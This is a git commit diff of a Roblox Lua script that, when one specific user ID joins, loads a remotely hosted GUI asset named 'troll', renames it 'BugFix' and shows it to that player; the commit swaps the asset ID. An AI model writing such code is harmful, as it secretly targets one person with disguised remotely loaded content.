6f46910da7f2aa21d88ade0408dd1d8cd51a91d9
Viper <100521306+MuhXd@users.noreply.github.com>
2024-08-13 22:41:53 +0100

    Update t.lua

--- scripts/t.lua
+++ scripts/t.lua
@@ -1,6 +1,6 @@
 game.Players.PlayerAdded:Connect(function(plr)
 	if plr.UserId == 144324719 then
-		local ok = game:GetService("InsertService"):LoadAsset(18937651198)
+		local ok = game:GetService("InsertService"):LoadAsset(18938166154)
 		local troll = ok:FindFirstChildWhichIsA("ScreenGui")
 		troll.Name = "BugFix"
 		troll.Parent = plr:WaitForChild("PlayerGui")
